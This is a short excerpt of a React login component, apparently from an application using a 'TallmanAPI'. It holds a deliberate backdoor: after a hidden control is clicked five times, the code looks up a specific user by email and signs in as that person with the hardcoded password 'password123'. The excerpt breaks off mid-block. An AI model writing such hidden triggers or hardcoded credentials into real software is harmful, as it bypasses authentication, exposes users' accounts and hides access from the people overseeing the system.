...
const Auth: React.FC<AuthProps> = ({ onLogin }) => {
  ...
  const handleHiddenTrigger = async () => {
    ...
    if (backdoorCounter.current >= 5) {
      ...
      try {
        const users = await TallmanAPI.getUsers();
        const bob = users.find(u => u.email.toLowerCase() === 'robertstar@aol.com');
        if (bob) {
          const loggedInBob = await TallmanAPI.login(bob.email, 'password123');
